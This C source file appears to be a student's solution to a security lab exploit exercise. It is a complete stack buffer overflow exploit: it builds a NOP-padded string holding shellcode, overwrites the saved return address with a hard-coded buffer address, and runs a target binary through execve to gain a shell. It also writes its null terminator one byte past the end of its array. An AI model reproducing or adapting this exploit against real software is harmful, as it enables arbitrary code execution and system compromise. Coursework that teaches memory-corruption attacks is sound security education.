#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

//pre-defined constant
//OVERFLOWBUFFER size is 124:(which is being determined as below)
//rip at 0x2021fe88 buf is at 0x2021fe10 the difference is 0x78 
//which is 120 bytes + the returned address size is 4 bytes
#define OVERFLOWBUFFER 124 
//pre-define no-op to fill the buffer
#define NOP 0x90 

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
        
        int i;
        int shellsize = strlen(shellcode);//shell code length
        char attacker_str[OVERFLOWBUFFER];// start from 0
        
        //building attacker string 
        //1.full the buffer with NOP
        for( i=0; i < OVERFLOWBUFFER; i++){
            attacker_str[i] = NOP;
        }
        //copying from shell 
        for ( i=0; i < shellsize; i++){
            attacker_str[i] = shellcode[i];
        }
        //returning the start of the buffer
        *(int*)&attacker_str[120] = 0x2021fe10;
        //null terminate
        attacker_str[OVERFLOWBUFFER] = '\0';
        
      
	args[0] = TARGET;
	args[1] = attacker_str;//was "hi there" before
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
